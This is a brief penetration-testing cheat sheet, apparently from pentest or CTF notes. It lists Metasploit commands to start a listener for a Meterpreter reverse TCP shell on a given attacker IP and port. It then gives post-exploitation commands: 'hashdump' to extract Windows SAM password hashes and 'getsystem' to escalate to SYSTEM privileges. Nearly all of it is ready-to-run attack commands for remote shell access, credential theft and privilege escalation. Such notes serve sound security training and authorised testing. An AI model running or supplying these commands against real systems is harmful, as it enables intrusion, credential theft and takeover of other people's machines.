# Meterpreter Privesc

To make the privilege escalation easier, We can switch to a meterpreter shell for ease of access of commands and run/load extensions and post-exploitation tools.

Ensure Handler is setup:

```
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST 10.10.10.10 
set LPORT 1234
run
```

Privilege Commands

```
Dumps the contents of the SAM database
hashdump
Attempt to elevate your privilege to that of local system.
getsystem    
```







